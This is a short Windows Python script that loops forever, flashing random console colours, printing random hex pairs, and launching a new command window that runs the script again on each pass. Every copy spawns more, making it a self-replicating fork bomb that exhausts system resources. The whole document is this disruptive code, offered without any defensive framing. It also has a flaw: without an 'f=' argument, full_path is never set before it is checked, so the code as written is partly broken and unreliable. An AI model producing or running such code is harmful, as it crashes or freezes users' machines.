from os import system, path
from sys import argv
from random import choice, randint

for arg in argv:
    if arg.startswith("f="):
        full_path = arg[2:]
        break

if full_path == "":
    full_path = f"\"{path.dirname(__file__)}\\{path.basename(__file__)}\""

def get_random_color():
    return choice(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F'])

while True:
    system(f"color {get_random_color()}{get_random_color()}")
    print(f"{get_random_color()}{get_random_color()} " * randint(1, 100))
    system(f"start cmd /K py \"{full_path}\" f=\"{full_path}\"")